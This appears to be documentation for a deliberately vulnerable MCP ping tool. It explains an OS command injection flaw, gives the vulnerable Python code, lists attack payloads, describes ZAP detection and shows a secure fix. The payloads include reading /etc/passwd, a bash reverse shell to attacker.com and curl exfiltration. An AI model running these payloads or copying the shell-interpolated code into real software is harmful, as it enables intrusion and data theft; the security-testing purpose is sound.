# OS Command Injection — CWE-78

## Description

User input is passed to the shell interpreter without sanitisation via `shell=True`.
An attacker can append additional shell commands using separators (`;`, `&&`, `|`, etc.)
and have them executed with the server's privileges. stdout/stderr are captured and
returned, making the injection immediately visible in the response.

## Vulnerable Code

```python
# tools/cmdi.py
result = subprocess.run(
    f"ping -c 2 {host}",
    shell=True,
    capture_output=True,
    text=True,
)
```

The `host` value is interpolated directly into the shell command string.

## Example MCP Call (benign)

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "ping_host",
    "arguments": {"host": "127.0.0.1"}
  },
  "id": 1
}
```

## Attack Payloads

### Basic injection — get current user
```
127.0.0.1; id
```
Returns ping output followed by `uid=0(root) gid=0(root) groups=0(root)`.

### Read system file
```
127.0.0.1; cat /etc/passwd
```

### Reverse shell
```
127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### Out-of-band exfiltration (blind)
```
127.0.0.1; curl http://attacker.com/$(whoami)
```

## Expected Response (basic injection)

```
PING 127.0.0.1 ...

uid=0(root) gid=0(root) groups=0(root)
```

## ZAP Detection

ZAP's OS Command Injection active scanner should detect:
- Response contains shell output indicators: `uid=`, `gid=`, `root`
- Time-based: `sleep 5` causes measurable response delay

## Secure Fix

Use a list argument (no shell interpolation) and validate input:

```python
import re, subprocess
if not re.match(r'^[\w.\-]+$', host):
    return "Invalid host"
result = subprocess.run(
    ["ping", "-c", "2", host],
    capture_output=True, text=True, timeout=10,
)
```
